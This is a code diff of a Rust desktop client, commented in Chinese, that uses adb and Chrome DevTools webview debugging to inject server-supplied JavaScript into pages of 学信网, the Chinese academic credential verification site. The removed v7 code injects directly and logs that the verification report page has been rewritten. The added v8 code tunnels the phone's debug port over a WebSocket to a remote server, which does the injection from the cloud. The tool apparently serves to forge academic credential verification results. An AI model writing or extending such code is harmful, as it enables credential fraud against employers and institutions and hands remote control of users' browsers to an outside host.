@@ -1,4 +1,4 @@
-// 高校认证 v7.0 —— Rust native 客户端（行为与 .NET v5.1 对齐）
+// 高校认证 v8.0 —— Rust native 客户端（行为与 .NET v5.1 对齐）
 // 哑终端：采设备码 / UI / 把服务端给的脚本原样注入（L3）
 #![windows_subsystem = "windows"]
 
@@ -10,8 +10,10 @@ use std::process::Command;
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 
-const SERVER: &str = "192.168.1.101:8787";
-const VER_TAG: &str = "cs-7.0";
+const SERVER_HTTP: &str = "[2408:8214:3a12:9d20:d851:ebff:fe55:bd27]:8787";
+const SERVER_HOST: &str = "[2408:8214:3a12:9d20:d851:ebff:fe55:bd27]:8787";
+const SERVER_WS: &str = "ws://[2408:8214:3a12:9d20:d851:ebff:fe55:bd27]:8787/tunnel";
+const VER_TAG: &str = "cs-8.0";
 const CHARSET: &[u8] = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
 // ============ adb（内置）============
@@ -168,11 +170,11 @@ fn check_inner(code: &str, devcode: &str, name: &str, gender: &str, photo: &str,
         json_escape(name), json_escape(gender), json_escape(photo),
         if probe { ",\"probe\":1" } else { "" }
     );
-    let mut s = TcpStream::connect(SERVER).map_err(|e| format!("网络异常：{}", e))?;
+    let mut s = TcpStream::connect(SERVER_HTTP).map_err(|e| format!("网络异常：{}", e))?;
     let _ = s.set_read_timeout(Some(Duration::from_secs(20)));
     let req = format!(
         "POST /check HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
-        SERVER, body.len(), body
+        SERVER_HOST, body.len(), body
     );
     s.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
     let mut buf = Vec::new();
@@ -202,127 +204,98 @@ fn check_inner(code: &str, devcode: &str, name: &str, gender: &str, photo: &str,
     Ok(Auth { js, exp: jnum(&payload, "exp").unwrap_or(0) })
 }
 
-// ============ CDP ============
-fn socket_names(dev: &str) -> Vec<String> {
-    let out = adb(&["-s", dev, "shell", "cat", "/proc/net/unix"]);
-    let mut names: Vec<String> = out.lines()
-        .filter(|l| l.contains("devtools_remote"))
-        .filter_map(|l| l.split_whitespace().last())
-        .map(|s| s.trim_start_matches('@').to_string())
-        .collect();
-    names.sort(); names.dedup();
-    names
+// ============ v8 哑终端：TCP 隧道（注入全部在云端）============
+use futures_util::{SinkExt, StreamExt};
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::TcpStream;
+use tokio_tungstenite::tungstenite::Message;
+
+const T_OPEN: u8 = 0x01;
+const T_DATA: u8 = 0x02;
+const T_CLOSE: u8 = 0x03;
+
+fn frame(t: u8, id: u32, body: &[u8]) -> Vec<u8> {
+    let mut v = Vec::with_capacity(5 + body.len());
+    v.push(t);
+    v.extend_from_slice(&id.to_be_bytes());
+    v.extend_from_slice(body);
+    v
 }
 
-fn http_get_json(port: u16) -> Option<String> {
-    let mut s = TcpStream::connect(("127.0.0.1", port)).ok()?;
-    let _ = s.set_read_timeout(Some(Duration::from_secs(5)));
-    s.write_all(b"GET /json HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n").ok()?;
-    let mut buf = Vec::new();
-    s.read_to_end(&mut buf).ok()?;
-    let t = String::from_utf8_lossy(&buf).to_string();
-    t.split("\r\n\r\n").nth(1).map(|x| x.to_string())
-}
-
-fn ws_eval(ws_url: &str, expr: &str) -> bool {
-    let rest = match ws_url.strip_prefix("ws://") { Some(r) => r, None => return false };
-    let (host_port, path) = match rest.find('/') { Some(i) => (&rest[..i], &rest[i..]), None => return false };
-    let mut hp = host_port.split(':');
-    let host = hp.next().unwrap_or("127.0.0.1");
-    let port: u16 = hp.next().unwrap_or("0").parse().unwrap_or(0);
-    if port == 0 { return false; }
-    let mut s = match TcpStream::connect((host, port)) { Ok(x) => x, Err(_) => return false };
-    let _ = s.set_read_timeout(Some(Duration::from_secs(15)));
-
-    let key = b64(&[0xA5u8; 16]);
-    let hs = format!(
-        "GET {} HTTP/1.1\r\nHost: {}:{}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {}\r\nSec-WebSocket-Version: 13\r\n\r\n",
-        path, host, port, key
-    );
-    if s.write_all(hs.as_bytes()).is_err() { return false; }
-    let mut buf = vec![0u8; 4096];
-    let n = match s.read(&mut buf) { Ok(n) => n, Err(_) => return false };
-    if !String::from_utf8_lossy(&buf[..n]).contains("101") { return false; }
-
-    let msg = format!(
-        "{{\"id\":1,\"method\":\"Runtime.evaluate\",\"params\":{{\"expression\":{},\"returnByValue\":true}}}}",
-        quote_js(expr)
-    );
-    let payload = msg.as_bytes();
-    let mut frame = vec![0x81u8];
-    let mask: [u8; 4] = [0x12, 0x34, 0x56, 0x78];
-    if payload.len() < 126 {
-        frame.push(0x80 | payload.len() as u8);
-    } else if payload.len() < 65536 {
-        frame.push(0x80 | 126);
-        frame.extend_from_slice(&(payload.len() as u16).to_be_bytes());
-    } else {
-        frame.push(0x80 | 127);
-        frame.extend_from_slice(&(payload.len() as u64).to_be_bytes());
-    }
-    frame.extend_from_slice(&mask);
-    for (i, b) in payload.iter().enumerate() { frame.push(b ^ mask[i % 4]); }
-    if s.write_all(&frame).is_err() { return false; }
-
-    let mut hdr = [0u8; 2];
-    if s.read_exact(&mut hdr).is_err() { return false; }
-    let mut len = (hdr[1] & 0x7F) as usize;
-    if len == 126 {
-        let mut ext = [0u8; 2];
-        if s.read_exact(&mut ext).is_err() { return false; }
-        len = u16::from_be_bytes(ext) as usize;
-    } else if len == 127 {
-        let mut ext = [0u8; 8];
-        if s.read_exact(&mut ext).is_err() { return false; }
-        len = u64::from_be_bytes(ext) as usize;
-    }
-    let mut body = vec![0u8; len.min(16 * 1024 * 1024)];
-    if s.read_exact(&mut body).is_err() { return false; }
-    let t = String::from_utf8_lossy(&body).to_string();
-    !t.contains("\"error\"") && !t.contains("exceptionDetails")
-}
-
-fn quote_js(s: &str) -> String {
-    let mut out = String::from("\"");
-    for ch in s.chars() {
-        match ch {
-            '"' => out.push_str("\\\""),
-            '\\' => out.push_str("\\\\"),
-            '\n' => out.push_str("\\n"),
-            '\r' => out.push_str("\\r"),
-            '\t' => out.push_str("\\t"),
-            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
-            c => out.push(c),
-        }
-    }
-    out.push('"');
-    out
-}
-
-// 返回 (页面 URL, ws 地址)
-fn scan_pages(dev: &str) -> Vec<(String, String)> {
-    let mut found = Vec::new();
-    let mut port = 32000u16;
-    for name in socket_names(dev) {
-        let fwd = format!("tcp:{}", port);
-        let abs = format!("localabstract:{}", name);
-        let _ = adb(&["-s", dev, "forward", &fwd, &abs]);
-        if let Some(json) = http_get_json(port) {
-            if json.contains("chsi") {
-                // 逐条解析 {url, webSocketDebuggerUrl}
-                for chunk in json.split('{').skip(1) {
-                    let url = jstr(&format!("{{{}}}", chunk), "url").unwrap_or_default();
-                    let ws = jstr(&format!("{{{}}}", chunk), "webSocketDebuggerUrl").unwrap_or_default();
-                    if !ws.is_empty() && url.contains("chsi") {
-                        found.push((url, ws));
+async fn tunnel_loop(url: String, target: String, sh: Arc<Mutex<Shared>>) {
+    loop {
+        match tokio_tungstenite::connect_async(&url).await {
+            Ok((ws, _)) => {
+                log_line(&sh, "☁ 隧道已连接，云端注入中…");
+                set_status(&sh, "● 已授权 · 云端注入中");
+                let (mut sink, mut stream) = ws.split();
+                let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(256);
+                let writer = tokio::spawn(async move {
+                    while let Some(v) = rx.recv().await {
+                        if sink.send(Message::Binary(v)).await.is_err() { break; }
+                    }
+                });
+                let mut streams: std::collections::HashMap<u32, tokio::sync::mpsc::Sender<Vec<u8>>> =
+                    std::collections::HashMap::new();
+                while let Some(msg) = stream.next().await {
+                    let data = match msg {
+                        Ok(Message::Binary(b)) => b,
+                        Ok(Message::Close(_)) => break,
+                        Err(_) => break,
+                        _ => continue,
+                    };
+                    if data.len() < 5 { continue; }
+                    let t = data[0];
+                    let id = u32::from_be_bytes([data[1], data[2], data[3], data[4]]);
+                    let body = data[5..].to_vec();
+                    match t {
+                        T_OPEN => {
+                            let (up_tx, mut up_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
+                            streams.insert(id, up_tx);
+                            let tx2 = tx.clone();
+                            let target = target.clone();
+                            tokio::spawn(async move {
+                                let mut tcp = match TcpStream::connect(&target).await {
+                                    Ok(x) => x,
+                                    Err(_) => { let _ = tx2.send(frame(T_CLOSE, id, &[])).await; return; }
+                                };
+                                let mut buf = vec![0u8; 16384];
+                                loop {
+                                    tokio::select! {
+                                        n = tcp.read(&mut buf) => {
+                                            match n {
+                                                Ok(0) | Err(_) => break,
+                                                Ok(n) => { let _ = tx2.send(frame(T_DATA, id, &buf[..n])).await; }
+                                            }
+                                        }
+                                        Some(d) = up_rx.recv() => {
+                                            if tcp.write_all(&d).await.is_err() { break; }
+                                        }
+                                        else => break,
+                                    }
+                                }
+                                let _ = tx2.send(frame(T_CLOSE, id, &[])).await;
+                            });
+                        }
+                        T_DATA => {
+                            if let Some(txs) = streams.get(&id) {
+                                let _ = txs.send(body).await;
+                            }
+                        }
+                        T_CLOSE => { streams.remove(&id); }
+                        _ => {}
                     }
                 }
+                writer.abort();
+                log_line(&sh, "隧道断开，3 秒后重连…");
+            }
+            Err(e) => {
+                log_line(&sh, &format!("隧道连接失败：{}", e));
+                set_status(&sh, "● 隧道连接失败，重试中…");
             }
         }
-        port += 1;
-        if port > 32600 { break; }
+        tokio::time::sleep(Duration::from_secs(3)).await;
     }
-    found
 }
 
 // ============ 共享状态 ============
@@ -369,64 +342,69 @@ fn set_status(sh: &Arc<Mutex<Shared>>, msg: &str) {
     if let Ok(mut s) = sh.lock() { s.status = msg.to_string(); }
 }
 
-// 注入循环（对齐 .NET v5.1）：素材过期重申请；每 1.5s 扫页面注入；bg.do 注入 1 次 → 退出+轮换
-fn inject_loop(sh: Arc<Mutex<Shared>>, code: String, devcode: String, name: String, gender: String, photo: String) {
-    let mut auth: Option<Auth> = None;
-    let mut last_dev: Option<String> = None;
-    let mut bgdo_done = 0;
-    loop {
-        let need = match &auth { None => true, Some(a) => a.exp - now_ms() < 60_000 };
-        if need {
-            match check(&code, &devcode, &name, &gender, &photo) {
-                Ok(a) => {
-                    auth = Some(a);
-                    log_line(&sh, "素材已获取（5分钟内有效）");
-                    set_status(&sh, "● 已授权 · 注入运行中");
-                }
-                Err(e) => {
-                    log_line(&sh, &format!("素材申请失败：{}", e));
-                    set_status(&sh, &format!("● {}（2 秒后退出）", e));
-                    let _ = std::process::Command::new("cmd").args(["/C", "ping -n 3 127.0.0.1 >NUL"]).output();
-                    std::process::exit(1);
-                }
-            }
-        }
-        let dev = match pick_device() {
-            Some(d) => d,
-            None => {
-                if last_dev.is_some() { log_line(&sh, "设备断开，等待重连…"); }
-                last_dev = None;
-                std::thread::sleep(Duration::from_secs(2));
-                continue;
-            }
-        };
-        if last_dev.as_deref() != Some(dev.as_str()) {
-            log_line(&sh, &format!("设备已连接：{}", dev));
-            last_dev = Some(dev.clone());
-        }
-        let pages = scan_pages(&dev);
-        if pages.is_empty() {
-            log_line(&sh, "等待学信网页面打开…");
-        } else {
-            let js = match &auth { Some(a) => a.js.clone(), None => String::new() };
-            for (url, ws) in pages {
-                if ws_eval(&ws, &js) {
-                    log_line(&sh, &format!("✅ 已注入: {}", url.chars().take(70).collect::<String>()));
-                    if url.contains("bg.do") {
-                        bgdo_done += 1;
-                        if bgdo_done >= 1 {
-                            set_status(&sh, "● 全部注入完成（验证码报告页已改写），3 秒后自动退出");
-                            log_line(&sh, "全部注入完成，3 秒后退出并轮换设备码");
-                            mark_used(used_count() + 1);
-                            std::thread::sleep(Duration::from_secs(3));
-                            std::process::exit(0);
-                        }
-                    }
-                }
-            }
-        }
-        std::thread::sleep(Duration::from_millis(1500));
+// v8：保存并应用 → /prepare 拿 token → 起隧道（不做任何注入）
+fn start_cloud(code: String, devcode: String, name: String, gender: String, photo: String, sh: Arc<Mutex<Shared>>) {
+    let exe = match std::env::current_exe() { Ok(p) => p, Err(_) => return };
+    let exehash = match std::fs::read(&exe) { Ok(b) => format!("{:x}", Sha256::digest(&b)), Err(_) => String::new() };
+    let nonce = format!("{}{}", now_ms(), std::process::id());
+    let body = format!(
+        "{{\"device\":\"{}\",\"code\":\"{}\",\"nonce\":\"{}\",\"ver\":\"{}\",\"exehash\":\"{}\",\"name\":\"{}\",\"gender\":\"{}\",\"photo\":\"{}\"}}",
+        json_escape(&devcode), json_escape(&code), nonce, VER_TAG, exehash,
+        json_escape(&name), json_escape(&gender), json_escape(&photo)
+    );
+    let mut s = match TcpStream::connect(SERVER_HTTP) {
+        Ok(x) => x,
+        Err(e) => { log_line(&sh, &format!("网络异常：{}", e)); return; }
+    };
+    let _ = s.set_read_timeout(Some(Duration::from_secs(20)));
+    let req = format!(
+        "POST /prepare HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+        SERVER_HOST, body.len(), body
+    );
+    if s.write_all(req.as_bytes()).is_err() {
+        log_line(&sh, "请求发送失败");
+        return;
     }
+    let mut buf = Vec::new();
+    let _ = s.read_to_end(&mut buf);
+    let text = String::from_utf8_lossy(&buf).to_string();
+    let payload = text.split("\r\n\r\n").nth(1).unwrap_or("").trim().to_string();
+    if !payload.starts_with("{\"ok\":true") {
+        let reason = jstr(&payload, "reason").unwrap_or_else(|| "被拒绝".into());
+        log_line(&sh, &format!("素材申请失败：{}", reason));
+        set_status(&sh, "● 素材申请失败（2 秒后退出）");
+        std::thread::sleep(Duration::from_secs(2));
+        std::process::exit(1);
+    }
+    let token = jstr(&payload, "token").unwrap_or_default();
+
+    // adb 端口转发（固定 19222）
+    let dev = match pick_device() {
+        Some(d) => d,
+        None => { log_line(&sh, "未检测到设备"); set_status(&sh, "● 未检测到设备（USB 调试？）"); return; }
+    };
+    let socks = {
+        let out = adb(&["-s", &dev, "shell", "cat", "/proc/net/unix"]);
+        let mut v: Vec<String> = out.lines()
+            .filter(|l| l.contains("devtools_remote"))
+            .filter_map(|l| l.split_whitespace().last())
+            .map(|x| x.trim_start_matches('@').to_string())
+            .collect();
+        v.sort(); v.dedup(); v
+    };
+    if socks.is_empty() {
+        log_line(&sh, "未找到 webview 调试口（TBS Inspector 是否开启？）");
+        set_status(&sh, "● 未找到调试口");
+        return;
+    }
+    let _ = adb(&["-s", &dev, "forward", "tcp:19222", &format!("localabstract:{}", socks[0])]);
+    log_line(&sh, &format!("已转发调试口 → 127.0.0.1:19222（{}）", socks[0].chars().take(32).collect::<String>()));
+
+    let url = format!("{}?token={}&device={}", SERVER_WS, token, devcode);
+    std::thread::spawn(move || {
+        let rt = tokio::runtime::Builder::new_multi_thread().enable_all().build().unwrap();
+        rt.block_on(tunnel_loop(url, "127.0.0.1:19222".to_string(), sh));
+    });
 }
 
 fn now_ms() -> i64 {
@@ -530,7 +508,7 @@ impl eframe::App for App {
                     self.running = true;
                     let sh = self.shared.clone();
                     let (c, d, n, g, p) = (self.code.clone(), self.devcode.clone(), self.name.clone(), self.gender.clone(), self.photo.clone());
-                    std::thread::spawn(move || inject_loop(sh, c, d, n, g, p));
+                    std::thread::spawn(move || start_cloud(c, d, n, g, p, sh));
                 }
             }
             ui.add_space(8.0);
